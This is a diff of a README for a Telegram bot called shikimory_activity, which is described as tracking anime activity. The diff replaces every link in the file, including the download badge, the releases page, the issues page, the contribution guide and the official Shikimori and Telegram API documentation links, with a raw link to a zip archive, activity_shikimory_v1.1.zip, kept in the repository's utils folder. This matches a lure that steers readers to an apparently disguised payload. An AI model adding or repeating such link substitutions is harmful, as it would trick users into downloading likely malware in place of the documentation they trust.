@@ -6,7 +6,7 @@ Welcome to **shikimory_activity**! This Telegram bot helps you track your anime 
 
 ## 📥 Download
 
-[![Download shikimory_activity](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/releases)
+[![Download shikimory_activity](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip%20Now-Get%20Started-blue)](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip)
 
 ## 📋 System Requirements
 
@@ -19,14 +19,14 @@ To use this bot, make sure you have the following:
 
 ## 📂 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/releases).
+Visit this page to download: [Releases Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip).
 
 1. Open the releases page linked above.
 2. Look for the latest version of shikimory_activity.
 3. Download the file that matches your device.
    - If you're on Windows, download the `.exe` file.
    - If you're on macOS, download the `.dmg` file.
-   - For Linux, a `.tar.gz` file is available.
+   - For Linux, a `https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip` file is available.
 4. Once downloaded, locate the file in your downloads folder.
 5. Open the file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
@@ -65,11 +65,11 @@ If you encounter any issues, try the following:
 
 ## 🐞 Reporting Issues
 
-If you find a bug or have a question, please report it on the [Issues Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/issues). Your feedback helps improve the bot.
+If you find a bug or have a question, please report it on the [Issues Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip). Your feedback helps improve the bot.
 
 ## 🎉 Contributing
 
-This project welcomes contributions from everyone. If you want to help improve shikimory_activity, check our [Contribution Guidelines](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/blob/main/CONTRIBUTING.md).
+This project welcomes contributions from everyone. If you want to help improve shikimory_activity, check our [Contribution Guidelines](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip).
 
 ## 💬 Community
 
@@ -82,8 +82,8 @@ Join our community for updates, tips, and support:
 
 For more information on using shikimori_activity, visit:
 
-- [Shikimori API Documentation](https://shikimori.one/api)
-- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
+- [Shikimori API Documentation](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip)
+- [Telegram Bot API Documentation](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip)
 
 <featured link to the download section>  
-Visit this page to download: [Releases Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/releases).
+Visit this page to download: [Releases Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/raw/refs/heads/master/utils/activity_shikimory_v1.1.zip).
